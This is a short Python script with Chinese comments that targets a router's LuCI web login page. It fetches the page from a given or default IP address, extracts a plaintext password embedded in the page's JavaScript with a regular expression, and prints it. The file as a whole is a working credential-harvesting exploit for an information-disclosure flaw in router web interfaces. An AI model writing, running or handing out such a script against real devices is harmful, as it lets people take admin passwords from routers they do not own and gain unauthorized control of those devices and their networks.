#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import sys
import base64
from urllib3.exceptions import InsecureRequestWarning

# 禁用SSL警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 默认IP地址
DEFAULT_IP = "192.168.10.1"

# 默认密码（从分析中获得）
DEFAULT_PASSWORD = ""

def get_router_password(ip_address):
    """
    从路由器登录页面获取默认密码
    """
    try:
        # 访问路由器登录页面
        response = requests.get(f"http://{ip_address}", timeout=10)
        
        # 检查是否有重定向到/cgi-bin/luci
        if response.status_code == 200 and "cgi-bin/luci" in response.text:
            # 直接访问/cgi-bin/luci
            response = requests.get(f"http://{ip_address}/cgi-bin/luci", timeout=10)
        
        # 在页面源代码中查找密码
        if response.status_code == 200:
            # 尝试使用正则表达式查找明文密码
            password_match = re.search(r'document\.getElementById\("password"\)\.value="([^"]+)"', response.text)
            if password_match:
                return password_match.group(1)
            
            # 如果没有找到，返回None
        return None
    except Exception as e:
        print(f"获取路由器 {ip_address} 密码时出错: {e}", file=sys.stderr)
        return None

def main():
    """
    主函数
    """
    # 从命令行参数获取IP地址，如果没有提供则使用默认IP
    ip_address = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_IP
    
    # 获取密码
    password = get_router_password(ip_address)
    
    # 打印密码
    print(password)

if __name__ == "__main__":
    main()